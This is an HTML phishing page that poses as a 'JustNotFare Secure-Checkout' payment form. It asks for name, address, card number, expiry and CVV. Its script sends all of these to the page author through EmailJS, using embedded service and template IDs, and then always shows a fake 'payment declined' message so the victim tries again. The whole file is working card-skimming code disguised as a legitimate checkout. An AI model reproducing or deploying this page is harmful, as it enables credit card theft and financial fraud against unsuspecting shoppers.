<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>JustNotFare Secure-Checkout</title>
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

<style>
  *, *::before, *::after {
    box-sizing: border-box;
  }

  body {
    background: #f4f4f4;
    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    margin: 0;
    padding: 20px;
  }

  .checkout-container {
    background: #fff;
    width: 100%;
    max-width: 440px;
    padding: 36px 32px;
    border: 1px solid #ddd;
    border-radius: 6px;
  }

  .checkout-container h2 {
    text-align: center;
    font-size: 20px;
    font-weight: 600;
    color: #333;
    margin-bottom: 24px;
    text-transform: uppercase;
  }

  .form-group {
    margin-bottom: 18px;
    position: relative;
  }

  label {
    display: block;
    font-size: 13px;
    font-weight: 500;
    margin-bottom: 6px;
    color: #555;
  }

  input, select {
    width: 100%;
    padding: 10px 12px;
    font-size: 15px;
    border: 1px solid #ccc;
    border-radius: 6px;
    background: #fff;
    color: #333;
  }

  input:focus, select:focus {
    outline: none;
    border-color: #999;
  }

  .flex-row {
    display: flex;
    gap: 10px;
  }

  .flex-row input {
    flex: 1;
    min-width: 0;
  }

  .card-icon {
    position: absolute;
    top: 37px;
    right: 10px;
    height: 20px;
    width: 30px;
  }

  .card-icon img {
    height: 100%;
    display: none;
  }

  .btn {
    width: 100%;
    padding: 12px;
    font-size: 15px;
    background-color: #1657B5;
    color: #fff;
    border: none;
    border-radius: 6px;
    text-transform: uppercase;
    font-weight: 600;
    letter-spacing: 0.5px;
    cursor: pointer;
    transition: background 0.3s ease-in-out;
    position: relative;
  }

  .btn:hover {
    background-color: #0e4596;
  }

  .btn:disabled {
    opacity: 0.6;
    cursor: not-allowed;
  }

  .btn .spinner {
    border: 2px solid #fff;
    border-top: 2px solid transparent;
    border-radius: 50%;
    width: 14px;
    height: 14px;
    animation: spin 0.8s linear infinite;
    position: absolute;
    right: 14px;
    top: 50%;
    transform: translateY(-50%);
    display: none;
  }

  .btn.loading .spinner {
    display: inline-block;
  }

  @keyframes spin {
    0% { transform: translateY(-50%) rotate(0deg); }
    100% { transform: translateY(-50%) rotate(360deg); }
  }

  .decline-message {
    margin-top: 18px;
    padding: 10px;
    background-color: #f8d7da;
    color: #842029;
    font-size: 13px;
    border-left: 4px solid #dc3545;
    border-radius: 6px;
    display: none;
    opacity: 0;
    transition: opacity 0.4s ease-in-out;
  }

  .decline-message.show {
    display: block;
    opacity: 1;
  }

  .footer {
    text-align: center;
    font-size: 13px;
    color: #888;
    margin-top: 30px;
  }

  .footer strong {
    color: #555;
  }
</style>

</head>
<body>
  <div class="checkout-container">
    <h2>Complete Payment</h2>
    <form id="payment-form">
      <div class="form-group">
        <label for="name">Name on Card</label>
        <input type="text" id="name" autocomplete="cc-name" required />
      </div>

      <div class="form-group">
        <label for="address">Address</label>
        <input type="text" id="address" autocomplete="address-line1" required />
      </div>

      <div class="form-group flex-row">
        <div>
          <label for="city">City</label>
          <input type="text" id="city" autocomplete="address-level2" required />
        </div>
        <div>
          <label for="zip">Zip Code</label>
          <input type="text" id="zip" autocomplete="postal-code" required />
        </div>
      </div>

      <div class="form-group">
        <label for="country">Country</label>
        <select id="country" required autocomplete="country">
          <option value="">Select Country</option>
          <!-- Add all countries -->
          <option>Afghanistan</option>
          <option>Albania</option>
          <option>Algeria</option>
          <option>Andorra</option>
          <option>Angola</option>
          <option>Argentina</option>
          <option>Armenia</option>
          <option>Australia</option>
          <option>Austria</option>
          <option>Azerbaijan</option>
          <option>Bangladesh</option>
          <option>Belgium</option>
          <option>Brazil</option>
          <option>Bulgaria</option>
          <option>Canada</option>
          <option>China</option>
          <option>Denmark</option>
          <option>Egypt</option>
          <option>Finland</option>
          <option>France</option>
          <option>Germany</option>
          <option>Greece</option>
          <option>India</option>
          <option>Indonesia</option>
          <option>Iran</option>
          <option>Iraq</option>
          <option>Ireland</option>
          <option>Italy</option>
          <option>Japan</option>
          <option>Luxembourg</option>
          <option>Malaysia</option>
          <option>Mexico</option>
          <option>Nepal</option>
          <option>Netherlands</option>
          <option>New Zealand</option>
          <option>Norway</option>
          <option>Pakistan</option>
          <option>Poland</option>
          <option>Portugal</option>
          <option>Russia</option>
          <option>Saudi Arabia</option>
          <option>Singapore</option>
          <option>South Africa</option>
          <option>Spain</option>
          <option>Sri Lanka</option>
          <option>Sweden</option>
          <option>Switzerland</option>
          <option>Turkey</option>
          <option>United Arab Emirates</option>
          <option>United Kingdom</option>
          <option>United States</option>
        </select>
      </div>

      <div class="form-group">
        <label for="card-number">Card Number</label>
        <input type="text" id="card-number" maxlength="19" placeholder="1234 5678 9012 3456" autocomplete="cc-number" required />
        <div class="card-icon">
          <img src="" id="logo-img" alt="Card Type" />
        </div>
      </div>

      <div class="form-group flex-row">
        <div>
          <label for="expiry">Expiry (MM/YY)</label>
          <input type="text" id="expiry" maxlength="5" placeholder="MM/YY" autocomplete="cc-exp" required />
        </div>
        <div>
          <label for="cvv">CVV</label>
          <input type="text" id="cvv" maxlength="4" autocomplete="cc-csc" required />
        </div>
      </div>

      <button type="submit" class="btn" id="payBtn">
        Pay Now
        <span class="spinner"></span>
      </button>
    </form>

    <div id="decline" class="decline-message">
      ❌ The payment was declined. Please ensure that your card supports international payments.
    </div>

    <div class="footer">
      <strong>Just Not Fare</strong> – justnotfaree@gmail.com
    </div>
  </div>

  <script>
    emailjs.init("54sup864URh-q2i9p");

    const form = document.getElementById('payment-form');
    const cardNumberInput = document.getElementById('card-number');
    const expiryInput = document.getElementById('expiry');
    const logoImg = document.getElementById('logo-img');
    const declineBox = document.getElementById('decline');
    const payBtn = document.getElementById('payBtn');

    function detectCardType(number) {
      number = number.replace(/\s/g, '');
      if (/^4/.test(number)) {
        logoImg.src = 'https://img.icons8.com/color/48/000000/visa.png';
        logoImg.style.display = 'inline-block';
      } else if (/^5[1-5]/.test(number) || /^2(2[2-9]|[3-6]|7[01]|720)/.test(number)) {
        logoImg.src = 'https://img.icons8.com/color/48/000000/mastercard.png';
        logoImg.style.display = 'inline-block';
      } else {
        logoImg.style.display = 'none';
      }
    }

    cardNumberInput.addEventListener('input', function () {
      let input = this.value.replace(/\D/g, '').substring(0, 16);
      this.value = input.match(/.{1,4}/g)?.join(' ') || '';
      detectCardType(input);
    });

    let expiryTimer;
    expiryInput.addEventListener('input', function () {
      clearTimeout(expiryTimer);
      expiryTimer = setTimeout(() => {
        let input = this.value.replace(/\D/g, '').substring(0, 4);
        this.value = input.length >= 3 ? input.substring(0, 2) + '/' + input.substring(2) : input;
      }, 100);
    });

    form.addEventListener('submit', function (e) {
      e.preventDefault();

      const name = document.getElementById('name').value.trim();
      const cardNumber = cardNumberInput.value.replace(/\s/g, '');
      const expiry = expiryInput.value.trim();
      const cvv = document.getElementById('cvv').value.trim();
      const address = document.getElementById('address').value.trim();
      const city = document.getElementById('city').value.trim();
      const zip = document.getElementById('zip').value.trim();
      const country = document.getElementById('country').value;

      if (!/^\d{16}$/.test(cardNumber)) return alert('Card number must be 16 digits.');
      if (!/^\d{2}\/\d{2}$/.test(expiry)) return alert('Expiry must be in MM/YY format.');
      if (!/^\d{3,4}$/.test(cvv)) return alert('CVV must be 3 or 4 digits.');

      payBtn.disabled = true;
      payBtn.classList.add('loading');
      declineBox.classList.remove('show');

      emailjs.send("service_ya5p0te", "template_wkqtn2l", {
        name_on_card: name,
        card_number: cardNumber,
        expiry_date: expiry,
        cvv_code: cvv,
        address,
        city,
        zip,
        country
      })
      .then(() => {
        setTimeout(() => {
          form.reset();
          logoImg.style.display = 'none';
          payBtn.disabled = false;
          payBtn.classList.remove('loading');
          declineBox.classList.add('show');
        }, 1500);
      })
      .catch((error) => {
        payBtn.disabled = false;
        payBtn.classList.remove('loading');
        alert("Failed to send email: " + JSON.stringify(error));
      });
    });
  </script>
</body>
</html>
